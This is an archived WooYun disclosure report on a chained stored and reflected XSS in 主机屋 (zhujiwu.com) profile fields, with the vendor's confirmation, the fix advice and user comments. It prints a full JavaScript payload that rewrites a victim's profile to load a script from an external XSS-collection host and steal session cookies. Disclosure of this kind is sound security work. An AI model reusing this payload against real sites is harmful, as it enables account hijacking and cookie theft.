{"id": 7259, "wybug_id": "wooyun-2013-042343", "wybug_title": "主机屋XSS回旋镖--自插点的利用", "wybug_corp": "主机屋", "wybug_author": "xiaoL", "wybug_date": "2013-11-08 15:03", "wybug_open_date": "2013-12-23 15:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-23：\t细节向公众公开  简要描述： 主机屋自插点的利用，这样子的利用可以过了吧。 详细说明：  主机屋会员中心个人信息详细地址联系人QQ处都存在存储型XSS\n\n插入语句\"><img src=1 onerror=alert(/xss/)><input type=:hidden本来是一个自插的点，查找并没有发现越权修改个人信息的地方（@小川），本来以为就是个鸡肋。找着找着，发现这么个地址http://www.zhujiwu.com/test/test.asp貌似是检查白名单的地方，真不知道这个URL到底干嘛用的。插入的url参数直接带入了iframe框架src简直是白送的XSS，这样就可以从这跳跃到自插的位置了。于是我们构造javascript\n<meta charset=\"utf8\"><script lnaguage=\"javascript\">    function createRequest(){        var xmlHttp=false;    if(window.XMLHttpRequest){        xmlHttp = new XMLHttpRequest();    }else if(window.ActiveXObject){        try{            xmlHttp = new ActiveXObject(\"Msxml2.XMLHTTP\");        }catch(error1){            try{                xmlHttp = new ActiveXObject(\"Microsoft.XMLHTTP\");            }catch(error2){                xmlHttp = false;            }        }    }        return xmlHttp;    }    var getAddress;    if(getAddress=createRequest()){        getAddress.open(\"GET\",\"/member/account/basic.asp\");        getAddress.onreadystatechange=updatePage;        getAddress.send(null);        }    var xml;    function updatePage()    {        if(getAddress.readyState == 4 )        {            if(getAddress.status == 200)            {                var str = getAddress.responseText;                rex = /name=\"Address\" value=\"(.*)\" size=\"38\"/;                var ttt = rex.exec(str);                if(xml=createRequest()){                    xml.open(\"POST\",\"/cmd/member/setBasic.asp?cmd=set\");                    xml.onreadystatechange = attack;                    var body = \"areaID=0&provinceID=1&cityID=1&Address=\"+encodeURI(ttt[1])+\"%22%3E%3Cscript%20src%3Dhttp%3A%2F%2Fxssl.sinaapp.com%2F0S3c9D%3F1383890465%3E%3C%2Fscript%3E%3Cinput%20type%3D%22hidden&=&LinkMan=asdf&Tel=12345789&QQ=123456789&=%E4%BF%9D%E5%AD%98%E4%BF%AE%E6%94%B9&\";                    xml.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");                    xml.send(body);                                }            }else if(getAddress.status==404){                alert(\"404\");            }else {                alert(\"status:\"+getAddress.statusText);            }        }    }    function attack(){        if(xml.readyState == 4 ){            if(xml.status == 200){                            }        }    }</script>\n能够获取当前详细地址，再插入自己的代码，当成伪装了。主机屋并没有HTTPonly演示最后的过程发送我们访问的地址：http://www.zhujiwu.com/test/test.asp?url=xxxxx.sinaapp.com/xxxx.html不能暴露sae地址，类似这样的地址。原始页面：\n\n访问url后：\n\n\n\n收到的cookie\n\n   漏洞证明：  个人信息能看到的人还是很多的，比如管理员啊！这样伪装还能永久劫持个人用户！如上！   修复方案：  编码输出那三个位置就可以了！   版权声明：转载请注明来源 xiaoL@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-11-12 15:01 厂商回复： 感谢关注主机屋安全，已将此页面删除 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-08 16:27 |    \t\t乌云最帅的淫 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:23        | 不以淫荡惊天下,就以闷骚动世人)\t\t \n  话说 一个月前我就提交了. 被无视了.    \n     2013-11-08 17:19 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  @乌云最帅的淫 不单单是那个位置，结合利用的一个方案...    \n     2013-11-12 15:21 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  已将此页面删除    \n     2013-11-13 09:52 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  @xsser 估摸着那个页面确实不知道有什么用    \n     2013-12-10 21:35 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @xiaoL 是利用csrf修改个人信息么    \n     2013-12-23 15:16 |    \t\t0x004er \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:19        | 。。。。。。。)\t\t \n  ....    \n     2013-12-23 15:50 |    \t\tEvi1m0 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 邪红色信息安全组织)\t\t \n  已将此页面删除    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}